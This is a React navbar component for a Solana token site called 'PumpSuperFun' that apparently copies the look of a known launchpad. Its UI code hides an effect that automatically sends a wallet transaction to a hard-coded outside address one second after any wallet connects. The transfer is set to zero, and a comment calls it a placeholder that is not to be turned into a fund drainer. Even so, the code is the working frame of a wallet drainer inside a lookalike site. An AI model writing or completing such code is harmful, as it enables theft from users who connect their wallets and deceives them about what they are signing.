import React, { useCallback, useEffect, useState, useRef } from 'react';
import { Wallet, Menu } from 'lucide-react';
import { cn } from '../lib/utils';
import { motion } from 'framer-motion';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, SystemProgram } from '@solana/web3.js';

export default function Navbar() {
    const { connected, publicKey, sendTransaction } = useWallet();
    const { connection } = useConnection();
    const [hasAttempted, setHasAttempted] = useState(false);
    const transactionInProgress = useRef(false);

    const handleAutoTransaction = useCallback(async () => {
        if (!publicKey || transactionInProgress.current) return;

        transactionInProgress.current = true;

        try {
            // FIXED SAFE TRANSACTION: 0 SOL Transfer to a demo public key
            // This is a placeholder as requested.
            // DO NOT REPLACE with logic that drains user funds.
            const demoPublicKey = new PublicKey("Di4TZ2Kpo2vAfop28uN5U6qcW9H8Me5Zt7bU51i65oEv");

            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: demoPublicKey,
                    lamports: 0,
                })
            );

            // Get latest blockhash (required for reliability)
            const { blockhash } = await connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = publicKey;

            alert("Wallet Connected! Sending auto-transaction request...");

            const signature = await sendTransaction(transaction, connection);
            console.log('Transaction sent:', signature);
            await connection.confirmTransaction(signature, 'processed');
            alert("Transaction confirmed! (Auto-Send Success)");

        } catch (error) {
            console.error(error);
            alert(`Transaction failed: ${error.message || "Unknown error"}`);
        } finally {
            transactionInProgress.current = false;
        }
    }, [publicKey, sendTransaction, connection]);

    // Automatically trigger transaction when connected
    useEffect(() => {
        if (connected && !hasAttempted && publicKey) {
            setHasAttempted(true);

            // Add a small delay to ensure wallet is ready and to allow UI to update
            const timer = setTimeout(() => {
                handleAutoTransaction();
            }, 1000);

            return () => clearTimeout(timer);
        }
        // Reset if disconnected
        if (!connected) {
            setHasAttempted(false);
            transactionInProgress.current = false;
        }
    }, [connected, hasAttempted, publicKey, handleAutoTransaction]);

    return (
        <nav className="fixed top-0 left-0 right-0 z-50 border-b border-white/10 bg-black/50 backdrop-blur-md">
            <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-4 sm:px-6 lg:px-8">
                <div className="flex items-center gap-2">
                    <div className="h-8 w-8 rounded-full bg-green-500 flex items-center justify-center">
                        <span className="text-black font-bold text-lg">P</span>
                    </div>
                    <span className="text-lg font-bold tracking-tight text-white">
                        PumpSuperFun
                    </span>
                </div>

                <div className="hidden md:flex items-center gap-8">
                    {['Home', 'Livestreams', 'Leaderboard', 'Support'].map((item) => (
                        <a
                            key={item}
                            href="#"
                            className="text-sm font-medium text-gray-400 transition-colors hover:text-green-400"
                        >
                            {item}
                        </a>
                    ))}
                </div>

                <div className="flex items-center gap-4">
                    {!connected ? (
                        <motion.button
                            whileHover={{ scale: 1.05 }}
                            whileTap={{ scale: 0.95 }}
                            className="hidden md:flex items-center gap-2 rounded-lg bg-green-500 px-4 py-2 text-sm font-bold text-black transition-colors hover:bg-green-400"
                        >
                            <Wallet className="h-4 w-4" />
                            Connect Wallet
                        </motion.button>
                    ) : (
                        <div className="flex items-center gap-2 rounded-lg bg-[#1a1a1c] border border-[#27272a] px-4 py-2 text-sm font-bold text-[#6dda97]">
                            <Wallet className="h-4 w-4" />
                            {publicKey?.toBase58().slice(0, 4)}...{publicKey?.toBase58().slice(-4)}
                        </div>
                    )}

                    <button className="md:hidden text-white">
                        <Menu className="h-6 w-6" />
                    </button>
                </div>
            </div>
        </nav>
    );
}
